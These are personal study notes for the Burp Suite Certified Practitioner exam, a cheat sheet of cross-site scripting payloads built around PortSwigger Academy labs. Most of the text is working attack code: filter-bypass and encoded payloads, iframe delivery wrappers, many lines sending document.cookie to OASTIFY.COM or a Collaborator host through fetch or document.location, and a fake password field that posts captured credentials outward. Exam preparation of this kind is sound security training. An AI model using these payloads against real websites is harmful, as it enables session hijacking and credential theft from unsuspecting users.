### Stage 1 + 2
### Payload Resources
- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)

### CSP Evaluator
Check for CSP (mitigate XSS attacks) so we know to use other methods to exploit(?)
https://csp-evaluator.withgoogle.com/

### Payloads to Steal Cookies
[CookieStealer](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md)


**Need to learn bypasses**
- learn how to use the XSS cheat sheet
	- https://medium.com/@ossamayasserr/practice-exam-2-writeup-portswigger-academy-95096bb0b212
	- https://www.youtube.com/watch?v=Cyv3dEQcxM8
- learn how to identify + exploit xss without payloads + DOM Invader
	- https://www.youtube.com/watch?v=WCVIRx_eODE

---
#TODO For next time, need to learn how to quickly identify behaviors on how the input is reflected to corresponding payloads. Like if angle brackets are HTML encoded, then what to do.

--- 
### Ultimate XSS Polyglot
Try this monster xss payload. It just might work.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Identify Vulnerabilities in Exam
- Reflected/Stored XSS: Target scan search bar + comment field + website field
- DOM-based: DOM Invader

For payloads solutions that only sends through the URL
```
<iframe src="{URL_ENCODED_PAYLOAD}"></iframe>

# fetch Example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%27%3E%3Cimg%20src%20onerror="fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)"%3E1%27%22%3C%3E"></iframe>

# document.location Example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=2&storeId="></select><script>document.location%3d'https%3a//OASTIFY.COM/%3fdomxss%3d'%2bdocument.cookie</script>//"></iframe>
```

If `<script>` doesn't work, try:
- `</ScRiPt >`

Useful bypasses for "Potentially dangerous search term"
```
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >

"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"

"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```

**Different ways to get JS to fire**
- If your input is in an attribute like `href` in `<a href=" "` then try `javascript:alert();//`. The end result in page source should look like:
```
<a href="javascript:alert();//">Back</a>
```

- If your input is in an attribute like `<input value="test123">` then try `" onmouseover="alert();//"`. The `"` will escape the double quote in `value=""` then you can inject a new attribute for your JS to fire.
```
<input value="test123" onmouseover="alert();//"">
```

- If single quotes gets escapes like `test123'` turns into `test123\'` try 
```
# if your input is inside a <script> like
<script> var searchTerms = 'test123\' </script>

# use the payload
</script><script>alert(1)</script>

# The </script> will break out of the existing <script> tag
# Example
<script> var searchTerms = 'test123\' </script> <script>alert(1)</script> </script>
```

- If angle brackets are HTML encoded meaning `<script>` turns into `&lt;` and if your input is inside a `<script>` tag already then try using `;` to escape out
```
# if your input is inside a <script> like
<script> var searchTerms = 'test123\' </script>

# use semicolon to terminate the last method and start a new one
# your payload 
test123; alert();//

# Example
<script> var searchTerms = 'test123'; alert();// </script>
```




#### Single quote escaping
[Source](https://medium.com/infosecmatrix/cross-site-scripting-contexts-for-bug-bounty-portswigger-2024-b927cfa70de3)
```
# your input
';alert(document.domain)//

# gets converted to (notice the backslash)
\';alert(document.domain)//

# use this payload
\';alert(document.domain)//

# gets coverted to (an additional backslash) the 2nd backslash is interpreted literally; not a special character so that the single quote is now interprets as a string terminator -- allowing xss
\\';alert(document.domain)//
```

#### HTML encode payload
```
# xss example -- if the app escapes or blocks any characters within your payload, html encode them
<a href="#" onclick="... var input='controllable data here'; ...">

# payload example -- &apos; is html decoded to ' 
&apos;-alert(document.domain)-&apos;
```

#### JavaScript template literal
```
# if some special characters are unicode escaped like if single quote turned into \u0027 and in an JavaScript variable
<script> var message = `test123\u0027`; document.ElementById....

# payload like this will fire
${alert(document.domain)}

# Example
<script> var message = `test123\u0027 ${alert(document.cookie)}`
```

#### DOM-based
- `addEventListener`
	- `JSON.parse(e.data)` 
		- [[DOM-Based XSS#1.3. Lab DOM XSS using web messages and `JSON.parse` ⭕️]]
	- `getElementById()`
		- [[DOM-Based XSS#1.1. Lab DOM XSS using web messages ⭕️]]
	- `indexOf('http')`
		- [[DOM-Based XSS#1.2. Lab DOM XSS using web messages and a JavaScript URL ⭕️]]
- `lastViewedProduct`
	- [[DOM-Based XSS#1.5. Lab DOM-based cookie manipulation ⭕️]]
- `storeId={CITY}` like *storeId=London*
	- `document.write('</select>');` in Page Source
		- [[DOM-Based XSS#1.x. Lab DOM XSS in `document.write` sink using source `location.search` inside a select element ⭕️]]
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=2&storeId="></select><script>document.location%3d'https%3a//OASTIFY.COM/%3fdomxss%3d'%2bdocument.cookie</script>//"></iframe>
```
--
- `searchLogger.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.2. Lab DOM XSS via client-side prototype pollution ⭕️]]

- `jquery_3-0-0.js`
	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [[Client side#2.3. Lab DOM XSS via an alternative prototype pollution vector ⭕️]]

- `jQuery 1.8.2`
	- `GET /feedback?returnPath=/`
		- [[DOM-Based XSS#1.5. Lab DOM XSS in jQuery anchor `href` attribute sink using `location.search` source ⭕️]]
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3adocument.location%3d'https%3a//OATSIFY.COM%3fc%3d'%2bdocument.cookie"></iframe>

# Encoded version (document.location)
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3adocument.location%3d'https%3a//OATSIFY.COM%3fc%3d'%2bdocument.cookie

# Encoded version (fetch)
https://YOUR-LAB-ID.web-security-academy.net/feedback?returnPath=javascript%3afetch(`https%3a//OATSIFY.COM/c%3d`%2bdocument.cookie)%3b
```

- `returnUrl = /url`
	- [[DOM-Based XSS#1.4. Lab DOM-based open redirection ⭕️]]
- `html.replace`
	- [[DOM-Based XSS#1.x. Lab Stored DOM XSS ⭕️]]
- `hashchange`
	- [[DOM-Based XSS#1.x. Lab DOM XSS in jQuery selector sink using a hashchange event ⭕️]]

- "HTML is allowed"
	- [[DOM-Based XSS#1.x. Lab Exploiting DOM clobbering to enable XSS ⭕️]]

- DOM Invader > Inject forms > Search
	- `document.write(1)`
		- [[DOM-Based XSS#1.x. Lab DOM XSS in `document.write` sink using source `location.search` ⭕️]]
Deliver exploit to victim
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%27%3E%3Cimg%20src%20onerror="fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)"%3E1%27%22%3C%3E"></iframe>

# Encoded version
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%27%3E%3Cimg%20src%20onerror="fetch('https%3a//OASTIFY.COM/%3fc%3d'%2bdocument.cookie)"%3E1%27%22%3C%3E

# Decoded version
https://YOUR-LAB-ID.web-security-academy.net/?search="'><img src onerror="fetch('https://OASTIFY.COM/?c='+document.cookie)">1'"<>

```

^4not06
--
	- `element.InnerHTML(1)`
		- [[DOM-Based XSS#1.4. Lab DOM XSS in `innerHTML` sink using source `location.search` ⭕️]]
		- Use the same payload as [[Burp Suite Exam/Stage 1/XSS/README#^4not06]]
	- `element.setAttribute.href(1)` / `ng-app` / `angular 1.7.7`
		- [[DOM-Based XSS#1.x. Lab DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded ⭕️]]
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%7B%7B%24on.constructor%28%27document.location%3D%22https%3A%2F%2FOASTIFY.COM%3Fc%3D%22%2Bdocument.cookie%27%29%28%29%7D%7D"></iframe>

# Plug this in search bar
{{$on.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}
```
--
	- `eval(1)`
		- [[DOM-Based XSS#1.x. Lab Reflected DOM XSS ⭕️]]


#### Reflected XSS

```
# Test with this
'<script>alert(1)</script>

# Try this in search bar and check collaborator
'<script>fetch("https://OASTIFY.COM/?p='+document.cookie");</script>

# URL encode payload, wrap in iframe, deliver to victim
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%27%3Cscript%3Efetch%28%22https%3A%2F%2FOASTIFY.COM%2F%3Fp%3D%27%2Bdocument.cookie%22%29%3B%3C%2Fscript%3E"></iframe>
```
[[Reflected XSS#1.x. Lab Reflected XSS into HTML context with nothing encoded ⭕️]]

- Content-Security-Policy
	- [[Reflected XSS#1.x. Lab Reflected XSS protected by very strict CSP, with dangling markup attack ⭕️]]
- `rel="canonical"`
	- [[Reflected XSS#1.x. Lab Reflected XSS in canonical link tag ⭕️]]
- `&lt;script&gt;alert(1)&lt;/script&gt;`
	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into attribute with angle brackets HTML-encoded ⭕️]]
- `var searchTerms`
	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with angle brackets HTML encoded ⭕️]]
	- [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with single quote and backslash escaped ⭕️]]
	- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped ⭕️]]
- `var message`
	- Payload enclosed in backticks
		- [[Reflected XSS#1.x. Lab Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped ⭕️]]
- `var key`
	- [[Reflected XSS#1.x. Lab Reflected XSS with AngularJS sandbox escape without strings ⭕️]]
- "Tag is not allowed"
	- `<body>` / `<custom tags>` == 200 OK
		- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into HTML context with most tags and attributes blocked ⭕️]]
	- `<svg>` == 200 OK
		- [[Reflected XSS#1.x. Lab Reflected XSS with some SVG markup allowed ⭕️]]
	- `<xss+id=x>#x';` == 200 OK
		- <sup>Scan results: YES</sup> [[Reflected XSS#1.x. Lab Reflected XSS into HTML context with all tags blocked except custom ones ⭕️]]


#### Stored XSS

Simple Stored XSS example to grab victim cookies. No need to URL encode since we aren't sending this via an URL.
```
# document.location example
</p><script>document.location='https://OASTIFY.COM/?p='+document.cookie</script>

# fetch example
</p><script>fetch('https://OASTIFY.COM/?p='+document.cookie);</script>
```

**If alert(1) doesn't trigger**: then try posting any of this in a comment (replace with exploit url) and got entries in the access log from the victim, then we have blind xss.
![[README-20260219095007415.png|474]]
```
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```
[[Stored XSS#1.x. Lab Exploiting cross-site scripting to steal cookies ⭕️]]


- **Post Comment**
	- Solved with `</p><script>alert(1)</script>`
		- [[Stored XSS#1.x. Lab Stored XSS into HTML context with nothing encoded ⭕️]]
	- Solve with `javascript:alert(1)`
		- [[Stored XSS#1.x. Lab Stored XSS into anchor `href` attribute with double quotes HTML-encoded ⭕️]]
	- `website` field has client side validation / `onclick`
		- [[Stored XSS#1.x. Lab Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped ⭕️]]
	- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
		- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to steal cookies ⭕️]]
	- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
		- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to capture passwords ⭕️
- `POST /my-account/change-email`
	- Remove `csrf` token
		- 400 Bad Request: "Missing parameter 'csrf'"
			- [[Stored XSS#1.x. Lab Exploiting XSS to bypass CSRF defenses ⭕️]]


